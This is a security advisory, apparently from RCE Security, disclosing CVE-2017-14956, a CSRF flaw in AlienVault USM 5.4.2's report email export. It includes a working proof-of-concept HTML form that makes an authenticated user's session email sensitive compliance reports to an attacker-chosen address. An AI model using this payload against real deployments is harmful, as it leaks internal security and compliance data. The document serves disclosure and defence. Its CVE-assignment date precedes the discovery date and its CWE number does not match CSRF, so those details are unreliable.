@@ -1,0 +1,119 @@
+1. ADVISORY INFORMATION
+=======================
+Product:        AlienVault USM
+Vendor URL:     https://www.alienvault.com
+Type:           Cross-Site Request Forgery [CWE-253]
+Date found:     2017-09-22
+Date published: 2017-10-13
+CVSSv3 Score:   6.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)
+CVE:            CVE-2017-14956
+
+
+2. CREDITS
+==========
+This vulnerability was discovered and researched by Julien Ahrens from
+RCE Security.
+
+
+3. VERSIONS AFFECTED
+====================
+AlienVault USM 5.4.2 (current)
+older versions may be affected too.
+
+
+4. INTRODUCTION
+===============
+AlienVault Unified Security Management (USM) is a comprehensive approach to
+security monitoring, delivered in a unified platform. The USM platform includes
+five essential security capabilities that provide resource-constrained
+organizations with all the security essentials needed for effective threat
+detection, incident response, and compliance, in a single pane of glass.
+
+(from the vendor's homepage)
+
+
+5. VULNERABILITY DETAILS
+========================
+AlienVault USM v5.4.2 offers authenticated users the functionality to generate
+and afterwards export generated compliance reports via the script located at
+"/ossim/report/wizard_email.php". Besides offering an export via a local file
+download, the script does also offer the possibility to send out any report via
+email to a given address (either in PDF or XLSX format).
+
+An exemplary request to send the pre-defined report
+"PCI_DSS_3_2__Vulnerability_Details" to the email address "email () example com"
+looks like the following:
+
+https://example.com/ossim/report/wizard_email.php?extra_data=1&name=UENJX0RTU18zXzJfX1Z1bG5lcmFiaWxpdHlfRGV0YWlscw==&format=email&pdf=true&email=email
+ () example com
+
+The base64-encoded HTTP GET "name" parameter can be replaced with any other
+of the approx. 240 pre-defined reports, that are shipped with AlienVault USM
+since they do all have hardcoded identifiers, such as:
+- Alarm_Report
+- Ticket_Report
+- Business_and_Compliance
+- HIPAA_List_of_identified_ePHI_assets
+- PCI_DSS_3_2_Database_Users_Added
+- VulnerabilitiesReport
+etc.
+
+Since there is no anti-CSRF token protecting this functionality, it is
+vulnerable to Cross-Site Request Forgery attacks. An exemplary exploit to send
+the "PCI_DSS_3_2__Vulnerability_Details" report as a PDF-file to
+"email () example com" could look like the following:
+
+<html>
+  <body>
+    <form action="https://example.com/ossim/report/wizard_email.php";>
+      <input type="hidden" name="extra&#95;data" value="1" />
+      <input type="hidden" name="name" value="UENJX0RTU18zXzJfX1Z1bG5lcmFiaWxpdHlfRGV0YWlscw&#61;&#61;" />
+      <input type="hidden" name="format" value="email" />
+      <input type="hidden" name="pdf" value="true" />
+      <input type="hidden" name="email" value="email&#64;example&#46;com" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+6. RISK
+=======
+To successfully exploit this vulnerability a user with rights to access the
+compliance reports must be tricked into visiting an arbitrary website while
+having an authenticated session in the application.
+
+The vulnerability allows remote attackers to trigger a report generation and
+send the report out to an arbitrary email address, which may lead to the
+disclosure of very sensitive internal reporting information stored in AlienVault
+USM through pre-defined reports such as:
+- Alarms
+- Assets Inventory
+- Compliance Reports such as PCI DSS and HIPAA
+- Raw Logs
+- Security Events
+- Security Operations
+- Tickets
+- User Activity
+
+
+7. SOLUTION
+===========
+None.
+
+
+8. REPORT TIMELINE
+==================
+2017-09-22: Discovery of the vulnerability
+2017-09-22: Sent full vulnerability details to publicly listed security email
+            address
+2016-10-01: MITRE assigns CVE-2017-14956
+2017-10-03: No response from vendor, notified vendor again
+2017-10-13: No response from vendor
+2017-10-13: Public disclosure according to disclosure policy
+
+
+9. REFERENCES
+=============
+https://www.rcesecurity.com/2017/10/cve-2017-14956-alienvault-usm-leaks-sensitive-compliance-information-via-csrf
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14956
